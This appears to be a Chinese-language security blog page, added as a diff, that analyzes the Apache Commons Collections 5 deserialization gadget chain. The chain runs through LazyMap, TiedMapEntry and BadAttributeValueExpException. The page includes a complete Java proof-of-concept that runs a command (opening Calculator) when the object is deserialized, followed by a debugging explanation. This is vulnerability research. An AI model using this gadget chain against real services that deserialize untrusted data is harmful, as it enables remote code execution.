@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 5 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 5", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "\u5229\u7528\u94fe", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 6
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 4
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-5">Apache-Commons-Collections 5</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#利用链">利用链</a><ul>
+<li><a href="#TiedMapEntry-">TiedMapEntry </a></li>
+<li><a href="#BadAttributeValueExpException-">BadAttributeValueExpException </a></li>
+</ul>
+</li>
+</ul>
+<p>LazyMap+TideMap+BadAttributeValueExpException&#x20;</p>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 3.1 - 3.2.1，JDK 7u80 以上（低于7u80的BadAttributeValueExpException 无readObject方法）</p>
+<h2 id="_3">利用链</h2>
+<p>调试该链时，因为涉及toString函数调用，所以idea调试请关闭此俩选项</p>
+<p><img alt="" src="../image/image_Boksh8iwRB.png" /></p>
+<pre><code class="language-java">        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+public class cc5 {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;open  /System/Applications/Calculator.app&quot;})});
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(poc,tiedmap);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc5&quot;));
+            outputStream.writeObject(poc);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc5&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>前半部分和CC1一样，后半部分引入了TiedMapEntry 和BadAttributeValueExpException ，我们来分析一下这俩东西。</p>
+<h3 id="tiedmapentry">TiedMapEntry&#x20;</h3>
+<p>首先我们在CC1中已经知道了LazyMap的get方法会触发其在decorate中传入的Transfromer类的transform方法。</p>
+<p><img alt="" src="../image/image_n4Xp6o1PLY.png" /></p>
+<p>在TiedMapEntry类中存在方法getValue，会调用在构造函数中传入的map的get方法</p>
+<p><img alt="" src="../image/image_gqHDasdT8M.png" /></p>
+<p><img alt="" src="../image/image_Nfr8y6D0oX.png" /></p>
+<p>而且在TiedMapEntry类中同时也存在方法toString会调用getValue方法</p>
+<p><img alt="" src="../image/image_GyCP38HkyS.png" /></p>
+<h3 id="badattributevalueexpexception">BadAttributeValueExpException&#x20;</h3>
+<p>该类的readObject方法如下</p>
+<p><img alt="" src="../image/image_7dkmWWbT5v.png" /></p>
+<p>这里会调用toString方法，然后进入TideMapEntry开始链的执行。
+这里valObj就是val变量的值。</p>
+<pre><code class="language-java">       Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(poc,tiedmap);
+</code></pre>
+<p>所以我们在POC中用反射将val变量进行了赋值，赋的值是恶意TiedMapEntry 对象。</p>
+<p>这里有一个细节就是，val变量是可以通过构造函数赋值的。</p>
+<p><img alt="" src="../image/image_U-2IsdbTsd.png" /></p>
+<p>但是如果用构造函数直接给val赋值的话，会导致val在赋值的时候便触发toString,导致在反序列化时，valObject的值改变，导致原本预期的逻辑改变，无法进入预想的分支。</p>
+<p>这是预期的情况（通过后期反射赋值val）</p>
+<p><img alt="" src="../image/image_FlScvAzdag.png" /></p>
+<p>这是非预期情况（通过构造函数直接给val赋值，这里的val值直接变成了一个字符串，不要以为是ProcessImpl对象！注意引号！）</p>
+<p><img alt="" src="../image/image_UrxQ90FRJ5.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 6
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 4
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
